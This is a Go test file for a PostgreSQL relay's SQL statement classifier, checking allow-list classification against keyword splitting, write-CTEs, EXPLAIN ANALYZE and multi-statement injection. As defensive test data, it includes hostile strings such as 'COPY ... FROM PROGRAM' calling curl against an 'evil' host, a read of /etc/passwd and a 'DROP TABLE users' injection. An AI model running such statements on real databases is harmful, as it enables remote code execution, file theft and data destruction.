package pgwire

import "testing"

// The classifier's whole claim is that it is beaten by a spelling nobody
// thought of only in the safe direction. This is the table of spellings a deny
// list would have had to think of separately.
func TestAStatementIsClassifiedByItsShapeAndNotItsSpelling(t *testing.T) {
	for _, tc := range []struct {
		sql  string
		want Kind
	}{
		{"SELECT 1", KindSelect},
		{"select 1", KindSelect},
		{"  \n\t SELECT 1", KindSelect},
		{"/* a comment */ SELECT 1", KindSelect},
		{"-- a comment\nSELECT 1", KindSelect},
		{"/* /* nested */ still a comment */ SELECT 1", KindSelect},
		{"TABLE users", KindSelect},
		{"VALUES (1)", KindSelect},
		{"INSERT INTO t VALUES (1)", KindInsert},
		{"UPDATE t SET x = 1", KindUpdate},
		{"DELETE FROM t", KindDelete},
		{"MERGE INTO t USING s ON true", KindMerge},
		{"DROP TABLE t", KindDDL},
		{"CREATE TABLE t (x int)", KindDDL},
		{"TRUNCATE t", KindDDL},
		{"ALTER TABLE t ADD COLUMN y int", KindDDL},
		{"GRANT ALL ON t TO bob", KindGrant},
		{"REVOKE ALL ON t FROM bob", KindGrant},
		{"VACUUM FULL", KindMaintenance},
		{"CALL do_something()", KindCall},
		{"DO $$ BEGIN PERFORM 1; END $$", KindDo},
		{"SET search_path = public", KindSet},
		{"SHOW ALL", KindShow},
		{"BEGIN", KindBegin},
		{"START TRANSACTION", KindBegin},
		{"COMMIT", KindCommit},
		{"END", KindCommit},
		{"ROLLBACK", KindRollback},
		{"ABORT", KindRollback},
		{"LISTEN c", KindListen},
		{"NOTIFY c, 'hello'", KindNotify},
		{"LOCK TABLE t", KindLock},
		{"DECLARE c CURSOR FOR SELECT 1", KindDeclare},
		{"FETCH ALL FROM c", KindFetch},
		{"CLOSE c", KindCloseC},
		{"", KindEmpty},
		{"   ", KindEmpty},
		{"-- nothing but a comment", KindEmpty},

		// Nobody writes these; a relay that can be beaten by them has a
		// policy that is decorative.
		{"DR/**/OP TABLE t", KindUnknown},
		{"SEL/**/ECT 1", KindUnknown},
		{"WITH x AS (SELECT 1) SELECT * FROM x", KindSelect},

		// A statement mentioning a keyword in a string is not that keyword.
		{"SELECT 'DROP TABLE t'", KindSelect},
		{"SELECT $tag$ DROP TABLE t $tag$", KindSelect},
		{`SELECT "DROP"`, KindSelect},

		// And an unrecognised verb is refused rather than guessed at, which is
		// what makes the whole approach an allow list.
		{"VACUUUM", KindUnknown},
		{"FLUSH PRIVILEGES", KindUnknown},
		{"\\du", KindUnknown},
	} {
		got, ok := Statements(tc.sql, 0)
		if !ok {
			t.Errorf("%q: would not lex", tc.sql)
			continue
		}
		if len(got) != 1 {
			t.Errorf("%q: %d statements, want 1", tc.sql, len(got))
			continue
		}
		if got[0].Kind != tc.want {
			t.Errorf("%q: %s, want %s", tc.sql, got[0].Kind, tc.want)
		}
	}
}

// A data-modifying CTE is a write with a SELECT's leading keyword, and
// PostgreSQL has allowed it since 9.1. A policy that read the first word would
// let `WITH` through as a read.
func TestADataModifyingCTEIsAWrite(t *testing.T) {
	for _, tc := range []struct {
		sql  string
		want Kind
	}{
		{"WITH x AS (SELECT 1) SELECT * FROM x", KindSelect},
		{"WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x", KindDelete},
		{"WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x", KindInsert},
		{"WITH x AS (UPDATE t SET a = 1 RETURNING *) SELECT * FROM x", KindUpdate},
		{"with recursive x as (select 1) select * from x", KindSelect},
	} {
		got, ok := Statements(tc.sql, 0)
		if !ok || len(got) != 1 {
			t.Fatalf("%q: %v %d", tc.sql, ok, len(got))
		}
		if got[0].Kind != tc.want {
			t.Errorf("%q: %s, want %s", tc.sql, got[0].Kind, tc.want)
		}
		if got[0].Writes != (tc.want != KindSelect) {
			t.Errorf("%q: writes %v", tc.sql, got[0].Writes)
		}
	}
}

// EXPLAIN ANALYZE executes what it explains. This is the difference between a
// planner question and a DELETE.
func TestExplainAnalyzeIsTheStatementItRuns(t *testing.T) {
	for _, tc := range []struct {
		sql  string
		want Kind
	}{
		{"EXPLAIN SELECT 1", KindExplain},
		{"EXPLAIN DELETE FROM t", KindExplain},
		{"EXPLAIN (COSTS off) INSERT INTO t VALUES (1)", KindExplain},
		{"EXPLAIN ANALYZE SELECT 1", KindExplain},
		{"EXPLAIN ANALYZE DELETE FROM t", KindDelete},
		{"EXPLAIN ANALYSE INSERT INTO t VALUES (1)", KindInsert},
		{"explain (analyze true) update t set a = 1", KindUpdate},
	} {
		got, ok := Statements(tc.sql, 0)
		if !ok || len(got) != 1 {
			t.Fatalf("%q: %v", tc.sql, ok)
		}
		if got[0].Kind != tc.want {
			t.Errorf("%q: %s, want %s", tc.sql, got[0].Kind, tc.want)
		}
	}
}

// COPY is three operations wearing one keyword, and one of them is remote code
// execution with a SQL statement in front of it.
func TestCopyIsClassifiedByWhereItMovesDataTo(t *testing.T) {
	for _, tc := range []struct {
		sql  string
		want CopyTarget
	}{
		{"COPY t FROM STDIN", CopyIn},
		{"COPY t TO STDOUT", CopyOut},
		{"COPY t (a, b) TO STDOUT WITH CSV", CopyOut},
		{"COPY t TO '/tmp/x.csv'", CopyFile},
		{"COPY t FROM '/etc/passwd'", CopyFile},
		{"COPY t FROM PROGRAM 'curl http://evil/x'", CopyProgram},
		{"COPY t TO PROGRAM 'sh -c whoami'", CopyProgram},
		{"copy t from program 'id'", CopyProgram},
	} {
		got, ok := Statements(tc.sql, 0)
		if !ok || len(got) != 1 {
			t.Fatalf("%q: %v", tc.sql, ok)
		}
		if got[0].Kind != KindCopy {
			t.Errorf("%q: kind %s", tc.sql, got[0].Kind)
		}
		if got[0].Copy != tc.want {
			t.Errorf("%q: %s, want %s", tc.sql, got[0].Copy, tc.want)
		}
	}
}

// A semicolon is how every injection that ends in DROP TABLE is delivered. A
// relay that classified only the first statement would have a policy one
// semicolon wide.
func TestEveryStatementInAMessageIsClassified(t *testing.T) {
	got, ok := Statements("SELECT 1; DROP TABLE users", 0)
	if !ok {
		t.Fatal("would not lex")
	}
	if len(got) != 2 || got[0].Kind != KindSelect || got[1].Kind != KindDDL {
		t.Fatalf("%+v", got)
	}
	// A semicolon inside a string or a comment is not a separator.
	for _, sql := range []string{
		"SELECT 'a;b'",
		"SELECT 1 -- ; DROP TABLE t",
		"SELECT 1 /* ; DROP TABLE t */",
		"DO $$ BEGIN PERFORM 1; PERFORM 2; END $$",
	} {
		got, ok = Statements(sql, 0)
		if !ok {
			t.Errorf("%q: would not lex", sql)
			continue
		}
		if len(got) != 1 {
			t.Errorf("%q: %d statements, want 1: %+v", sql, len(got), got)
		}
	}
	// Trailing and doubled semicolons are not empty statements.
	if got, ok = Statements("SELECT 1;;;", 0); !ok || len(got) != 1 {
		t.Fatalf("trailing: %v %+v", ok, got)
	}
	if got, ok = Statements(";;", 0); !ok || len(got) != 1 || got[0].Kind != KindEmpty {
		t.Fatalf("only semicolons: %v %+v", ok, got)
	}
}

// Text that cannot be lexed is refused rather than classified. The relay and
// the server would disagree about where the statement ends, and disagreeing
// about that is how a statement gets past a relay that read a different one.
func TestTextThatCannotBeLexedIsRefusedRatherThanGuessed(t *testing.T) {
	for _, sql := range []string{
		"SELECT 'unterminated",
		`SELECT "unterminated`,
		"SELECT 1 /* unterminated",
		"/* /* only one closed */",
		"DO $$ unterminated",
		"DO $tag$ unterminated $nottag$",
	} {
		if _, ok := Statements(sql, 0); ok {
			t.Errorf("%q: lexed anyway", sql)
		}
	}
}

// The statement count is a number the client chooses.
func TestTooManyStatementsIsRefused(t *testing.T) {
	if _, ok := Statements("SELECT 1; SELECT 2; SELECT 3", 2); ok {
		t.Fatal("three statements accepted with a bound of two")
	}
	if _, ok := Statements("SELECT 1; SELECT 2", 2); !ok {
		t.Fatal("two statements refused by a bound of two")
	}
}

// A comment is whitespace, not nothing: a reader that deleted it would join the
// halves of a keyword somebody split on purpose.
func TestACommentIsWhitespaceAndNotNothing(t *testing.T) {
	for _, sql := range []string{"SEL/**/ECT 1", "SEL--x\nECT 1", "DR/**/OP TABLE t"} {
		got, ok := Statements(sql, 0)
		if !ok {
			t.Fatalf("%q: would not lex", sql)
		}
		if got[0].Kind != KindUnknown {
			t.Errorf("%q: %s, want unknown", sql, got[0].Kind)
		}
	}
}

// A statement this classifier cannot name counts as a write, so that the
// read_only setting and an allow list of kinds both refuse it without an
// operator having to think about the unknown case at all.
func TestAnUnknownStatementCountsAsAWrite(t *testing.T) {
	got, ok := Statements("FLUSH PRIVILEGES", 0)
	if !ok {
		t.Fatal("would not lex")
	}
	if got[0].Kind != KindUnknown || !got[0].Writes {
		t.Fatalf("%+v", got[0])
	}
}

// PREPARE and COMMIT mean two different things depending on the next word, and
// the two-phase ones are a different decision: a prepared transaction outlives
// the session that made it and holds its locks until somebody resolves it.
func TestTheTwoPhaseStatementsAreTheirOwnKind(t *testing.T) {
	for _, tc := range []struct {
		sql  string
		want Kind
	}{
		{"PREPARE p AS SELECT 1", KindPrepare},
		{"PREPARE TRANSACTION 'x'", KindTransactionAdmin},
		{"COMMIT", KindCommit},
		{"COMMIT PREPARED 'x'", KindTransactionAdmin},
		{"ROLLBACK", KindRollback},
		{"ROLLBACK PREPARED 'x'", KindTransactionAdmin},
	} {
		got, ok := Statements(tc.sql, 0)
		if !ok || got[0].Kind != tc.want {
			t.Errorf("%q: %s, want %s", tc.sql, got[0].Kind, tc.want)
		}
	}
}

func TestAKindIsNamedTheWayAConfigurationWritesIt(t *testing.T) {
	for _, k := range Kinds() {
		got, ok := KindOf(string(k))
		if !ok || got != k {
			t.Errorf("%s: %s %v", k, got, ok)
		}
	}
	if _, ok := KindOf("SELECT"); !ok {
		t.Error("an upper-case kind was refused")
	}
	// unknown is not a kind a configuration may name: allowing it would mean
	// allowing every statement this classifier cannot read, which is the one
	// thing the design exists to prevent.
	if _, ok := KindOf("unknown"); ok {
		t.Error("unknown was accepted as a configurable kind")
	}
	if _, ok := KindOf("nonsense"); ok {
		t.Error("a kind that is not a kind was accepted")
	}
	if len(KindNames()) != len(Kinds()) {
		t.Error("the names and the kinds disagree")
	}
}
